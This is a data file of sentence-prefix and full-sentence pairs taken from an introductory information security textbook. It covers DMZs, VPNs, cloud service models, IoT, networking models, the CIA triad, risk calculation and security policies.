12 dmz network internet desktop networkinternal servers dmz using a dmz is network,12 dmz network internet desktop networkinternal servers dmz using a dmz is network isolation along with tight access control and restrictive rules around accessing the network
"network segmentation can also isolate other systems , with-out","network segmentation can also isolate other systems , with-out necessarily introducing the firewall rules or access control lists"
"for example , there may also be a guest network to allow vendors and other visitors","for example , there may also be a guest network to allow vendors and other visitors to have network access without any ability to get access to any of the internal systems"
"remote access jumping into the tardis for a moment to go way , way","remote access jumping into the tardis for a moment to go way , way back in time , remote access used to be handled with modems and dialup access"
"those days are long past , though the need for remote workers to gain access","those days are long past , though the need for remote workers to gain access to internal resources is perhaps even more necessary than it has been in the past"
this wouldn ’ t normally be handled across the,this wouldn ’ t normally be handled across the open internet but instead through the use of encryption
virtual private networks ( vpns ) are a way,virtual private networks ( vpns ) are a way to gain access to the internal network from remote locations
"instead , the network provider may offer some-thing within","instead , the network provider may offer some-thing within their network to get from one location to the other"
mpls provides what is essentially a tunnel from one location to another by encapsulating,mpls provides what is essentially a tunnel from one location to another by encapsulating traffic inside a label where the traffic gets switched from one location to the other
ip security ( ipsec ) is a set of extensions that,"ip security ( ipsec ) is a set of extensions that , in part , provide for encryption from one location to another"
ipsec comes with a number of protocols that provide not only,"ipsec comes with a number of protocols that provide not only encryption but also message authentication , user authentication , and key exchange"
"because ipsec isn ’ t an inherent part of ipv4 , it","because ipsec isn ’ t an inherent part of ipv4 , it requires the use of some other mechanism to implement over ipv4 networks"
this generally requires inserting something into the network stack to,this generally requires inserting something into the network stack to catch the traffic being sent and applying appropriate ipsec policies
"web connections often use transport layer security ( tls ) , which is the","web connections often use transport layer security ( tls ) , which is the current implementation of encryption for web traffic , superseding secure sockets layer ( ssl )"
"as this is a well-known and commonly used method of encryption , companies often have many","as this is a well-known and commonly used method of encryption , companies often have many of the infrastructure requirements , like certificate authorities , necessary to implement this type of vpn"
"additionally , this type of vpn is often deployed","additionally , this type of vpn is often deployed using a web browser rather than a heavier-weight application installation"
cloud computing the world of computing has long had the nature of,"cloud computing the world of computing has long had the nature of a pendulum , particularly when it comes to where the computing power existed"
"decades ago , in the 1960s and ’ 70s , there","decades ago , in the 1960s and ’ 70s , there were service bureaus that companies went to when they had computing needs"
businesses had to trust these service bureaus with their information in order to have their jobs performed,"businesses had to trust these service bureaus with their information in order to have their jobs performed , whether it was payroll or data merges for mailing lists or what-ever the need happened to be"
"when personal computers ( pcs ) became a thing , companies could buy one and","when personal computers ( pcs ) became a thing , companies could buy one and have their very own computer systems to perform the jobs they needed to have run"
"eventually , the cost of the pc came down and the business could afford multiple systems , so","eventually , the cost of the pc came down and the business could afford multiple systems , so data was stored on the individual systems , or at least on floppy disks at the users ’ desks"
later there were swings to put more terminals from the,"later there were swings to put more terminals from the mainframe on users ’ desks , cen- tralizing data storage again"
"when the world wide web was created and businesses started realizing the value of having full-time connections to the internet , they","when the world wide web was created and businesses started realizing the value of having full-time connections to the internet , they used hosting provid-ers to outsource functions like websites , where there may be at least marketing materials if not other business data"
when internet access got to be really cheap,"when internet access got to be really cheap and ubiquitous , busi-nesses took their hosting back in-house"
all of this is to say that we are now back at,all of this is to say that we are now back at a point where outsourcing is the way a lot of businesses go
this means attackers can ’ t breach an externally available system and use it as a jumping-off point to,"this means attackers can ’ t breach an externally available system and use it as a jumping-off point to other systems on the network , including desktops where personal information may be stored , or even sensitive business data"
"initially there were hosting providers , where companies would take on the cost of the hard-ware and all the","initially there were hosting providers , where companies would take on the cost of the hard-ware and all the infrastructure , offering that hardware and infrastructure to companies that didn ’ t want to host their own systems"
"this hardware was sometimes dedicated to the business that was renting it for its services , which made it hard","this hardware was sometimes dedicated to the business that was renting it for its services , which made it hard to recoup the costs of the hardware and still have the pricing make sense to go with a hosting provider"
then there were businesses like amazon and google that,then there were businesses like amazon and google that had large farms of systems that were sometimes idle
these companies developed services where businesses could,these companies developed services where businesses could use those idle systems for their own purposes
"because all of these services were available over the internet , and","because all of these services were available over the internet , and not on premises , they were said to be available in the cloud"
storage as a service is very basic remote disk functionality,storage as a service is very basic remote disk functionality that can be just as geared toward users as toward businesses
businesses are more likely to use infrastructure as a ser-vice,businesses are more likely to use infrastructure as a ser-vice ( iaas ) or platform as a service ( paas )
"they may also use software as a service , though","they may also use software as a service , though that can also be geared toward at-home users as well"
"android devices don ’ t always use cloud storage by default , though generally there is the capability to store data","android devices don ’ t always use cloud storage by default , though generally there is the capability to store data to either google drive , google ’ s storage as a service solution , or to the storage provided by another vendor"
"storage as a service has a large number of uses , including backups and the","storage as a service has a large number of uses , including backups and the ability to access your data no matter where you are or what device you are using"
"using google drive , i have been able to view documents on different","using google drive , i have been able to view documents on different computers and tablets , depending on what my need was at any given time"
"i could search for documents on my laptop , download the pdf files of research papers , and then","i could search for documents on my laptop , download the pdf files of research papers , and then store them in my google drive account , where i could open them on a tablet and read them comfortably"
13 google drive some storage as a service providers give you access to your storage using either a web,13 google drive some storage as a service providers give you access to your storage using either a web interface or with a plug-in on your system so you can look at everything in a file explorer context
"for example , apple doesn ’ t give you direct access to","for example , apple doesn ’ t give you direct access to everything stored in icloud , whether through finder or a web interface"
"instead , you have to manage different sections of your","instead , you have to manage different sections of your storage using the applications that make use of the data"
this requires the provider to make sure there are adequate,this requires the provider to make sure there are adequate controls in place to keep unauthorized users from getting access
this might mean an authorized user getting inadvertent access,this might mean an authorized user getting inadvertent access to files they shouldn ’ t be authorized for
infrastructure as a service businesses can spend a lot of money on the hardware,infrastructure as a service businesses can spend a lot of money on the hardware necessary to maintain all the services they require just to stay operational and efficient
"not only are hardware systems expensive when you add all the hardware costs together , but the infrastructure","not only are hardware systems expensive when you add all the hardware costs together , but the infrastructure necessary to support the hardware—power , floor space , networking , cooling systems , fire suppression—is very costly"
keep in mind that best practice often suggests process isolation,"keep in mind that best practice often suggests process isolation , meaning that systems don ’ t necessarily run multiple applications"
"instead , the email server gets its own hardware , the","instead , the email server gets its own hardware , the web server gets its own hardware , and on and on"
"while virtualization has been around since the 1980s , it ’ s really only been in the last decade or so that the hardware has","while virtualization has been around since the 1980s , it ’ s really only been in the last decade or so that the hardware has become beefy enough and the software has evolved to be able to really support running several virtual systems on top of a single piece of hard-ware"
"consumer virtualization has been around for ages , but businesses haven ’ t been able to","consumer virtualization has been around for ages , but businesses haven ’ t been able to make effective use of that software because they are trying to manage maybe hundreds of systems"
"cloud providers like amazon , google , and microsoft make extensive use of vms to","cloud providers like amazon , google , and microsoft make extensive use of vms to give their users the ability to run systems on hardware owned and maintained by the pro-vider"
the business that needs the system doesn ’ t have to pay the,the business that needs the system doesn ’ t have to pay the hardware costs or any of the other costs that come with having hardware around
"additionally , businesses , particularly small or medium-sized businesses , probably can ’ t afford","additionally , businesses , particularly small or medium-sized businesses , probably can ’ t afford high-end power management with redundancy and fault tolerance or high-end networking or cooling or fire suppression"
they may not even be able to find highly skilled,they may not even be able to find highly skilled people they can afford to pay to maintain all the systems
certainly by comparison to acquiring a hardware system and then getting it provisioned,"certainly by comparison to acquiring a hardware system and then getting it provisioned , setting up an instance with a cloud provider takes almost no time"
"if you need an infra-structure system , you go to the portal for your computing provider and","if you need an infra-structure system , you go to the portal for your computing provider and select the operating system you want , then the size of the hardware—memory size and disk space"
14 shows a very small sample of systems that are available with amazon,14 shows a very small sample of systems that are available with amazon web services ( aws ) using its elastic compute cloud ( ec2 )
there are several other pro- viders that offer have the same,"there are several other pro- viders that offer have the same sort of service , including microsoft , google , and digital ocean"
"using this approach , you could spin up a set of","using this approach , you could spin up a set of infrastructure systems to support a complete web application in an afternoon"
you could also get a complete security solution,you could also get a complete security solution with policies preventing adversaries from gaining unauthorized access
while the providers do their very best to help keep their customers protected,"while the providers do their very best to help keep their customers protected , it still comes down to correct provisioning on the part of the customer"
"microsoft , for example , has network security groups that allow the customer","microsoft , for example , has network security groups that allow the customer to create rules to allow and disallow traf - fic into the virtual systems"
"the customer could easily create bad rules , and there really isn ’ t","the customer could easily create bad rules , and there really isn ’ t anything microsoft can do to keep that customer from shooting itself in its bottom line"
"platform as a service sometimes just a piece of hardware ,","platform as a service sometimes just a piece of hardware , even virtual , with an operating system installed isn ’ t sufficient"
"in addition to just getting a system , you can get an instance of a system that","in addition to just getting a system , you can get an instance of a system that is already configured with enter-prise software , like database servers , application servers , or even security devices"
15 shows a small collection of some of the,15 shows a small collection of some of the applications that are available in the amazon web services marketplace
"after selecting one of these applications , based on what is needed , the","after selecting one of these applications , based on what is needed , the virtual machine with the necessary operating system is started and the application is already installed"
"in addition to the ones available in the marketplace , you can","in addition to the ones available in the marketplace , you can create your own images , stored as amazon machine images ( amis )"
"16 shows a list of cate- gories in which images are available , as well","16 shows a list of cate- gories in which images are available , as well as a list of database servers that you can select to create an instance from"
"in addition to all of the microsoft-provided solutions , there","in addition to all of the microsoft-provided solutions , there are a large number of vendors providing their own solutions"
some of the possibilities are virtual images of solutions,some of the possibilities are virtual images of solutions that may normally be thought of as hardware appliances
"firewalls , load balancers , denial of service protection","firewalls , load balancers , denial of service protection , and other security functions are available for selection"
"using paas , you can quickly create an entire virtual network with","using paas , you can quickly create an entire virtual network with all of the virtual devices needed to support the service or application"
"if needed , systems from inside the enterprise network","if needed , systems from inside the enterprise network can be integrated with the ones from the cloud provider"
normal access protocols are commonly used to get to the virtual,"normal access protocols are commonly used to get to the virtual devices , like ssh and remote desktop protocol ( rdp )"
"this means that these services would be exposed to the outside world ,","this means that these services would be exposed to the outside world , though access rules can be created to narrow access down to specific source addresses"
"by default , though , the services may be exposed","by default , though , the services may be exposed to the outside world , meaning they are available to attack"
"there may be network address translation ( nat ) in place , forwarding","there may be network address translation ( nat ) in place , forwarding messages destined to the external ip address to a private address inside the solution"
16 azure marketplace images software as a service native applications,16 azure marketplace images software as a service native applications that run on your desktop aren ’ t always required anymore
"again , you may not be bound to a specific system with","again , you may not be bound to a specific system with a piece of software that ’ s licensed just to that system"
"instead , many companies are offering their applications in the cloud ,","instead , many companies are offering their applications in the cloud , meaning they have developed their applications to run inside a web browser"
you may have run across these services if you have used,"you may have run across these services if you have used google docs or office online , just as a couple of examples"
"in some cases , as in the case of google and microsoft , there is","in some cases , as in the case of google and microsoft , there is already storage as a service on offer , so any documents you create are stored there"
"in many cases , you can get started without any up-front costs , depending","in many cases , you can get started without any up-front costs , depending on what you are looking for and how often you are going to use it"
"from a security standpoint , this sort of solution and delivery","from a security standpoint , this sort of solution and delivery actually has the potential to vastly improve the process of fixing vulnerabilities"
"when a vulnerability in a web appli-cation is discovered , it can be resolved","when a vulnerability in a web appli-cation is discovered , it can be resolved , tested , and deployed without any work on the part of the end user"
because applications are not always updated when they are running on an end user,"because applications are not always updated when they are running on an end user ’ s system , people aren ’ t running out-of-date software full of vulnerabilities"
it also means that the data is transmitted from,it also means that the data is transmitted from the web browser to the service provider over the internet
"most sites support ssl/tls , so the communication would be encrypted , but","most sites support ssl/tls , so the communication would be encrypted , but there have been vulnerabilities in ssl , which have led to information exposure"
it ’ s just worth keeping in mind that data being,it ’ s just worth keeping in mind that data being trans-mitted across networks has the potential to be captured and analyzed
internet of things if you don ’ t have several,"internet of things if you don ’ t have several of these devices in-house , you ’ ve probably seen them"
"beyond those , though , are home automation devices","beyond those , though , are home automation devices , digital video recorders , and cable/satellite set-top boxes"
any of these devices that have embedded software and also have network access,any of these devices that have embedded software and also have network access are considered to be part of the internet of things ( iot )
"essentially , anything that can be reached over the network that doesn ’ t have a","essentially , anything that can be reached over the network that doesn ’ t have a built-in screen or the ability to take direct user interaction is part of the internet of things"
smartphones or general-purpose computers would not be part of the internet of things because they,"smartphones or general-purpose computers would not be part of the internet of things because they have traditional input/output devices like a screen and keyboard , even if the keyboard is virtual"
"a reason to bring this up here , with cloud solutions ,","a reason to bring this up here , with cloud solutions , is that cloud providers are support- ing these devices by offering communications hubs"
other applications like databases and machine learn-ing systems can then be,other applications like databases and machine learn-ing systems can then be used with the data that ’ s acquired for processing and analytics
messaging protocols like mqtt may use a pub-lish/subscribe model,messaging protocols like mqtt may use a pub-lish/subscribe model for multiple devices to gain access to a messaging bus
"these service offerings from cloud providers give every business , including startups , the ability to create an","these service offerings from cloud providers give every business , including startups , the ability to create an infrastructure and an application to support devices they want to manu-facture without a lot of investment up front"
"it ’ s because of all of this , and also because much of what we ’ ll be talking","it ’ s because of all of this , and also because much of what we ’ ll be talking about in coming chapters relies on networks , that it can be really helpful to understand the funda-mentals of computer networking"
conceptual frameworks can help with understanding how,conceptual frameworks can help with understanding how communication between systems and applications takes place
"it has seven layers—physical , data link , network","it has seven layers—physical , data link , network , transport , session , presentation , and application"
one thing to keep in mind as you are thinking about these models is that a layer,one thing to keep in mind as you are thinking about these models is that a layer on one system communi-cates with the corresponding layer on the system with which it ’ s communicating
the network layer in the sent message is handled by,"the network layer in the sent message is handled by the network layer on the receiving side , for example"
this is sometimes called the darpa model because the arpanet,this is sometimes called the darpa model because the arpanet where the protocol suite was developed was funded by darpa
"rather than seven layers as in osi , tcp/ip has four","rather than seven layers as in osi , tcp/ip has four layers , though those four layers encompass the same set of functionalities"
the link layer of the tcp/ip architec-ture encompasses the physical and data link layers from the osi model,"the link layer of the tcp/ip architec-ture encompasses the physical and data link layers from the osi model , while the applica-tion layer takes in the session , presentation , and application layers from the osi model"
"a ring network is actually wired , commonly , like a star but it","a ring network is actually wired , commonly , like a star but it behaves like a ring where messages travel around the ring looking for the systems"
"a common hybrid is the star-bus , where the central access devices","a common hybrid is the star-bus , where the central access devices , like a switch , are all wired together through a bus"
"when looking at system communications , you will run across protocols like","when looking at system communications , you will run across protocols like ethernet that take care of connecting endpoints like desktop computers to the network"
any device on a local network wanting to communicate with another device,any device on a local network wanting to communicate with another device on the same local network would do it using the mac address
"ip is a best effort delivery protocol , meaning that the protocol has mechanisms that help ensure that messages (","ip is a best effort delivery protocol , meaning that the protocol has mechanisms that help ensure that messages ( called packets , which is the protocol data unit at this layer ) can get from the source to the destination"
these mech-anisms are expressed in a series of header fields like the source and destination,"these mech-anisms are expressed in a series of header fields like the source and destination ip addresses and the ip identification field , in case packets need to be fragmented"
they provide ports to enable multiplexing—meaning multiple applications can make use of network functionality at the,they provide ports to enable multiplexing—meaning multiple applications can make use of network functionality at the same time by listening on a different port than the port on which another application listens
"tcp , whose pdu is called a segment , uses a three-way handshake","tcp , whose pdu is called a segment , uses a three-way handshake and also sequence numbers to guarantee delivery of messages in the correct order"
a lan would be a network that is contained within a,"a lan would be a network that is contained within a small geographic area like a floor , building , or campus"
"this is available from companies like google , amazon , and microsoft ,","this is available from companies like google , amazon , and microsoft , which all offer virtual machines that can be provisioned and turned up very quickly"
companies can also use these cloud providers to support and manage embedded devices,"companies can also use these cloud providers to support and manage embedded devices like thermostats , garage door openers , dvrs , and other similar devices"
"they can be used to register , manage , and com-municate with a wide","they can be used to register , manage , and com-municate with a wide variety of devices that are connected to home and business networks around the world"
"in this chapter , we ’ re going to cover some of the","in this chapter , we ’ re going to cover some of the subject matter that helps security professionals make decisions about how best to protect enterprises"
"by the end of the chap - ter , you ’ ll have the basics","by the end of the chap - ter , you ’ ll have the basics behind you and we ’ ll have started to talk about hard , defensive mechanisms"
"first , you need to understand what is meant","first , you need to understand what is meant by information security—what events fall into the security bucket"
it ’ s an essential concept for people who hold a certified information systems security professional (,"it ’ s an essential concept for people who hold a certified information systems security professional ( cissp ) certification , which is a certification that covers the entire gamut of information security topics"
identifying potential risks and associated potential losses can help with decision-making around where,"identifying potential risks and associated potential losses can help with decision-making around where to expend limited resources—budget , manpower , capital expenditures , and so on"
it will also help security professionals determine what policies they need in place to,"it will also help security professionals determine what policies they need in place to guide the actions of employ-ees overall and , more specifically , information technology staff"
they are all considered essential for determining,they are all considered essential for determining how a company approaches protecting its information assets
"once you have your policies in place , decisions","once you have your policies in place , decisions can be made about how best to protect information resources"
there are a number of devices that can be placed,there are a number of devices that can be placed into a network to help with infor - mation protection
"these are meant not only to keep attackers out , but also to provide information that can be used","these are meant not only to keep attackers out , but also to provide information that can be used to identify intrusions , including the path an attacker may have taken to gain access to networks and systems"
there may also be elements that are placed in the network,there may also be elements that are placed in the network that can automatically detect an intrusion attempt and then block that attempt
"where these elements and devices are placed is important , and those decisions","where these elements and devices are placed is important , and those decisions are made based on ideas such as defense in depth and defense in breadth"
"alongside the security devices , there are system-level mechanisms that can be very helpful","alongside the security devices , there are system-level mechanisms that can be very helpful in providing more context to the information provided by firewalls and intrusion detec-tion systems"
all of these elements and decisions together are,all of these elements and decisions together are needed to create a complete defense of the enterprise
"from an attack perspective , a tester or adversary would be","from an attack perspective , a tester or adversary would be looking to com - promise one of these elements within an organization"
one reason it is shown that way is that with,"one reason it is shown that way is that with an equilateral triangle , all the sides are the same length"
"they have the same value or weight , which is meant to demonstrate the none","they have the same value or weight , which is meant to demonstrate the none of the properties of the triad is any more important than any of the other proper-ties"
"different situations will highlight different elements , but when it comes to the overall security","different situations will highlight different elements , but when it comes to the overall security of an organization , each is considered to have equal weight to have a well-balanced approach"
"1 the cia triad availabilityintegrity conﬁdentiality something else that might occur to you , as you look at the figure","1 the cia triad availabilityintegrity conﬁdentiality something else that might occur to you , as you look at the figure , is that if any of the sides are removed or compromised , it ’ s no longer a triangle"
if any of these properties is removed or compromised,"if any of these properties is removed or compromised , the security of your organization has also been compromised"
"confidentiality perhaps we should go back to kindergarten for this ,","confidentiality perhaps we should go back to kindergarten for this , though you may have more recent memories or experiences that apply"
you expect that when you share a secret with your,"you expect that when you share a secret with your friend , that secret will remain between you and your friend"
"imagine , after all , if you were to tell your friend that you really , really ,","imagine , after all , if you were to tell your friend that you really , really , really liked the person who sat behind you in class and your friend were to tell that person"
"that would be mortifying , though the mortification level","that would be mortifying , though the mortification level would likely be in inverse relationship to your age"
"when we are talking about confidentiality here , we","when we are talking about confidentiality here , we should be thinking about it in two dimensions—static and dynamic"
"it ’ s this transmission that makes it dynamic and not necessarily that it is being altered , though data","it ’ s this transmission that makes it dynamic and not necessarily that it is being altered , though data being sent from one place to another could definitely be experiencing alteration through interaction with the user and the application"
"when we are making use of encryption for web-based communication ,","when we are making use of encryption for web-based communication , the secure sockets layer/transport layer ( ssl/tls ) security protocols are used"
ssl and tls both specify how to generate encryption keys from data that is known,"ssl and tls both specify how to generate encryption keys from data that is known , as well as some partial data that is transmitted from one side to the other"
if the data is decrypted by someone who shouldn ’,"if the data is decrypted by someone who shouldn ’ t have seen it , confidentiality has of course been compromised"
"attacks against the encryption mechanisms—ciphers , key exchange algorithms ,","attacks against the encryption mechanisms—ciphers , key exchange algorithms , and so on—can also lead to a compromise of confidentiality"
"a successful attack against the encryption , and there have been successful attacks","a successful attack against the encryption , and there have been successful attacks against various encryption methods and standards , will lead to ciphertext being decrypted"
"bad components in a computer system happen , and","bad components in a computer system happen , and those bad com-ponents can result in data loss or corruption"
"you mistakenly overwrite a section of the real document , thinking you are in the scratch document ,","you mistakenly overwrite a section of the real document , thinking you are in the scratch document , and then , because you don ’ t trust autosave , you save the document you are working in"
this might be considered a loss of data integrity because important,this might be considered a loss of data integrity because important pieces of the document you are working in have been altered
"if you don ’ t have a backup from which to replace data , you may not be able to recover the original , and it could be","if you don ’ t have a backup from which to replace data , you may not be able to recover the original , and it could be that you don ’ t even notice the mistake until the document has been sent around the office with the text contain - ing the mistake in it"
"when you browse to a website that uses encryption , a certificate is used","when you browse to a website that uses encryption , a certificate is used to provide keying , meaning the cer-tificate holds keys used for encryption and decryption"
when a certificate contains a name that is different from the hostname being visited,"when a certificate contains a name that is different from the hostname being visited , your browser will generate an error , as you can see in figure 3"
if you didn ’ t know that the furniture row company owned sofa mart,"if you didn ’ t know that the furniture row company owned sofa mart , you might begin to question whether you were being hijacked in some way"
an attack in this situation may have resulted in an attacker gathering information from your,"an attack in this situation may have resulted in an attacker gathering information from your session , which you wouldn ’ t have expected because you believed the session was encrypted"
imagine writing a letter and digitally adding a signature,imagine writing a letter and digitally adding a signature so it appears to have been written by someone else
availability this is perhaps the easiest to understand,availability this is perhaps the easiest to understand and one of the most commonly compromised properties
it comes down to whether information or services are,it comes down to whether information or services are available to the user when they are expected to be
"if you were to keep information on an external drive , then go somewhere—work , on site with","if you were to keep information on an external drive , then go somewhere—work , on site with a client—and forget to bring the drive , the files on that drive wouldn ’ t be available"
"it wouldn ’ t be malicious , but it would still be a failure of avail-ability","it wouldn ’ t be malicious , but it would still be a failure of avail-ability since you wouldn ’ t be able to access what you need when you need it"
making a change to a service configuration without testing the,making a change to a service configuration without testing the change may result in the service not coming back up
"in production , this can be very problematic , especially","in production , this can be very problematic , especially if it ’ s not clear that the service failed"
some services will appear to have restarted when in,some services will appear to have restarted when in fact the configuration caused the service start to fail
"even if it ’ s a short period of time before the change has been rolled back ,","even if it ’ s a short period of time before the change has been rolled back , there is a possibility of users of the service not being able to perform the functions they expect"
"recently , i was reading about a case of a cluster where six out of the","recently , i was reading about a case of a cluster where six out of the seven devices took an upgrade cleanly while the seventh device was still on the older code"
because there were some incompatibilities with the communication between the older code and the newer,"because there were some incompatibilities with the communication between the older code and the newer code , all the devices went into a bad loop , shutting out all legitimate requests"
a denial of service ( dos ) attack denies access to a,"a denial of service ( dos ) attack denies access to a service , which translates to the service being unavailable for legitimate traffic"
attackers can overwhelm the service with a lot of,"attackers can overwhelm the service with a lot of requests , making it difficult for the service to respond"
"a legitimate request would have a hard time getting through the noise , and","a legitimate request would have a hard time getting through the noise , and even if the request got through , the service may not be able to respond"
"dos attacks have been common for decades now , though the change in available bandwidth and other","dos attacks have been common for decades now , though the change in available bandwidth and other technology changes mean that the attacks have had to change along with the technology and band-width increases"
"these are not considered standard , because there is some debate as","these are not considered standard , because there is some debate as to whether it ’ s necessary to break the additional properties out"
the three additional properties parker believes are necessary are as follows : possession ( or control ) if you had mistakenly handed the,"the three additional properties parker believes are necessary are as follows : possession ( or control ) if you had mistakenly handed the external drive mentioned earlier to a friend , thinking you were handing them back their drive , the drive would be in their control"
"if the friend never plugged the drive in to look at it ,","if the friend never plugged the drive in to look at it , the data on it would not be subject to a breach of confidentiality"
"however , the fact that the drive is not in your control any longer does","however , the fact that the drive is not in your control any longer does mean that it is not available to you , meaning it is a loss of availability"
this is one reason this property isn ’ t included in,"this is one reason this property isn ’ t included in the primary triad , though it can be an impor-tant distinction"
"as an example , when you digitally sign an email message , the recipient can be certain that","as an example , when you digitally sign an email message , the recipient can be certain that the message originated from you because the message includes your digital signature , which no one else should have"
"authenticity is making sure that when you get a piece of data , no matter","authenticity is making sure that when you get a piece of data , no matter what it is , it ’ s actually from where it pur-ports to be from"
"you don ’ t have the cable anymore , and addi-tionally , the","you don ’ t have the cable anymore , and addi-tionally , the interfaces on your computer have all changed since the last time you used it"
"all of this makes the data on that tape useless , in spite","all of this makes the data on that tape useless , in spite of the fact that it is in my possession and technically available to me"
"while these properties do raise specific ideas that are important to think about , you","while these properties do raise specific ideas that are important to think about , you could also fit the scenarios into the three properties that are part of the cia triad"
possession and utility situations could be said to fall,"possession and utility situations could be said to fall under availability , and authentic-ity could be placed under integrity"
"after all , if the source of a piece of data is said to be one","after all , if the source of a piece of data is said to be one thing when in fact it isn ’ t , the integrity of the data is invalid"
what you get with the parkerian hexad is some specific,what you get with the parkerian hexad is some specific cases rather than the broader concepts from the cia triad
if it ’ s more useful for you to break them out from the others as you are thinking about,"if it ’ s more useful for you to break them out from the others as you are thinking about what security means and what events are security-related , the hexad may be more useful for you than the triad"
this is a condensed idea and it can take a lot,"this is a condensed idea and it can take a lot to unpack , especially given common misunderstandings of what risk is"
"often , you will see the term risk used when what","often , you will see the term risk used when what the speaker really means to say is chance , or probability"
what is really meant is that there is a probability of that event happening,"what is really meant is that there is a probability of that event happening , and presumably , the event is one that could be perceived as negative"
"a very simple way to calculate probability , which is commonly expressed as a","a very simple way to calculate probability , which is commonly expressed as a ratio , is to divide the number of events by the number of outcomes"
"as an example , what is the probability of any day in","as an example , what is the probability of any day in april falling on a weekend ? there are 30 days in april"
"if you wanted to , you could reduce that to 4 out of 15 , but 8 out","if you wanted to , you could reduce that to 4 out of 15 , but 8 out of 30 says the same thing and it ’ s clearer to see where the information came from"
"if you wanted to refine that , you could ask about a specific april to see if","if you wanted to refine that , you could ask about a specific april to see if , based on how the days aligned , there were more than 8 weekend days that year"
what is the prob- ability of your enterprise being hit by a distributed ( based on the acronym you are using ) denial of service attack ? according to imperva,"what is the prob- ability of your enterprise being hit by a distributed ( based on the acronym you are using ) denial of service attack ? according to imperva incapsula , using its online ddos downtime cost calculator , the probability of a 2,500-person company that is in the e-commerce busi-ness getting hit with a ddos is 36 percent"
what is an event here ? what is an outcome ? for every 100 connection attempts,"what is an event here ? what is an outcome ? for every 100 connection attempts to your network , 36 will be ddos messages ? that doesn ’ t make sense"
"as i said , calculating the probability of risk is challenging , and even","as i said , calculating the probability of risk is challenging , and even if you do , it may be hard to understand the results you get"
let ’ s say that your business has been,let ’ s say that your business has been compromised and some of your intellectual property has been exfiltrated
"since the intellectual property isn ’ t gone , meaning you still have it in your control ,","since the intellectual property isn ’ t gone , meaning you still have it in your control , what is the tangible loss ? it depends on who took it and what they took it for"
if someone in another country took it and your business doesn ’ t sell any product,"if someone in another country took it and your business doesn ’ t sell any product there , is there an actual loss ? certainly , there are costs associated with cleanup"
if you don ’ t bring in an outside contractor to do the cleanup,"if you don ’ t bring in an outside contractor to do the cleanup for you , you are using your own people , whom you are already paying"
an outside contrac-tor will have hard costs in the form,an outside contrac-tor will have hard costs in the form of a bill your company will be expected to pay
"that will come out of your bottom line , so there is","that will come out of your bottom line , so there is , for sure , a number that can be applied to loss there"
"how do you calculate the cost of cleanup if it ’ s your own people , though","how do you calculate the cost of cleanup if it ’ s your own people , though ? you ’ re already paying them , so the cost is in deferred actions on other projects"
the dollar sign is included in there to be clear,the dollar sign is included in there to be clear about the terms so you know what the end result means
you can compare the risk of different events by using quantitative comparison,you can compare the risk of different events by using quantitative comparison if you know the monetary value of the loss and the probability
"because of that , if you were to ask someone what a high-risk event in their lives is , outside of","because of that , if you were to ask someone what a high-risk event in their lives is , outside of information security , they may well give you an example of an event that may result in death , like driving"
"if you have an event that has a high risk value , it","if you have an event that has a high risk value , it is probably a good idea to apply resources to protect against that event"
"this is what makes information security diffi cult—understanding events , probabilities ,","this is what makes information security diffi cult—understanding events , probabilities , and out-comes for your organization and then planning to protect against negative events"
a threat is something that has the possibility to incur,"a threat is something that has the possibility to incur a breach of confi dentiality , integrity , or availability"
"this may be its software , its confi guration","this may be its software , its confi guration , or how the entire information solution is put together"
a code review shows that there is a problem and the,"a code review shows that there is a problem and the result of the problem could result in data cor-ruption , for example"
"however , because of the speed at which the program executes , it ’","however , because of the speed at which the program executes , it ’ s essentially impossible to sit in between the two instructions to make the change"
a race condition is a programmatic situation where one process or thread,a race condition is a programmatic situation where one process or thread is writing data while another process or thread is reading that data
"once you have identified what resources you care about , you","once you have identified what resources you care about , you should think about what threat agents may care about those resources"
"once you know what your vulnerabilities are and the potential threat vectors , you","once you know what your vulnerabilities are and the potential threat vectors , you can start to think about how you are going to protect against those threats"
"policies , standards , and procedures while we , as information security professionals , can often think about security for the sake","policies , standards , and procedures while we , as information security professionals , can often think about security for the sake of security as the most important thing , the fact is that security is a business enabler , not a business driver"
"because security is a business enabler , the business sets the parameters","because security is a business enabler , the business sets the parameters around what is important and the means to protect what is important"
security policies a security policy is a statement of,security policies a security policy is a statement of intention with regard to the resources of a business
"it defines what a company considers to be security—what resources need to be protected , how","it defines what a company considers to be security—what resources need to be protected , how resources should be utilized in a proper manner , how resources can or should be accessed"
these policies are essential to good corporate governance,"these policies are essential to good corporate governance , since the policies are lines that management draws"
this means that having management set the tone and direction is,"this means that having management set the tone and direction is not only a good idea , it ’ s also required"
management and the board of directors have an obliga-tion to,management and the board of directors have an obliga-tion to the stakeholders in the business—the individual owners or the shareholders
security policies are not only about defining important resources,"security policies are not only about defining important resources , they are also about setting expectations of employees"
any violation of this policy on the part of the employee is generally cause for sanction,"any violation of this policy on the part of the employee is generally cause for sanction or termination , depending on the extent of the violation and the impact to the business"
there may be other security policies that are,there may be other security policies that are more directed at information technology or information security staff
keep in mind as you are thinking about security policy that the goals of,"keep in mind as you are thinking about security policy that the goals of your policies should be the confidentiality , integrity , and availability of information resources"
"all information resources should be confidential , have integrity","all information resources should be confidential , have integrity and be available within the parameters defined by the business"
this doesn ’ t mean that all information resources should,"this doesn ’ t mean that all information resources should always be confidential , have integrity , and be available"
"different information assets will have different levels of confidentiality ,","different information assets will have different levels of confidentiality , and not all information has to be available all the time"
this is also part of what security policy is for—to,this is also part of what security policy is for—to help classify and prioritize the information assets of the organization
one area that policy should always take into consideration,one area that policy should always take into consideration is how the human resources are to be handled
"this may not always be codified in information security policy , but human resources should always be a factor , especially","this may not always be codified in information security policy , but human resources should always be a factor , especially when it comes to protecting against natural disasters and other events that may be physically dangerous as well as impacting informa-tion assets"
they are sufficiently high-level that they shouldn ’ t change every time there is a,"they are sufficiently high-level that they shouldn ’ t change every time there is a new set of technologies available , but they should evolve with changes in the threat landscape"
"as information resources change and threat agents change , the","as information resources change and threat agents change , the policies may need to adapt to be responsive to those changes"
"as this is an area of corporate governance , any policy change would have to be","as this is an area of corporate governance , any policy change would have to be approved by whatever management structure is in place—business owners , board of directors , and so on"
if you ’ re looking at security policies and you ’ re starting to think about the operational impacts and how the administrator would handle the,"if you ’ re looking at security policies and you ’ re starting to think about the operational impacts and how the administrator would handle the policy , you ’ re too close to the ground and it ’ s time to beat your wings a bit more to get much higher up"
"also , you are thinking conceptually for what should be","also , you are thinking conceptually for what should be long-term rather than something specific to a point in time"
the standard starts down the path of how we get from statements of intent to,"the standard starts down the path of how we get from statements of intent to implementation , so we start to drill down from the high level of the policy"
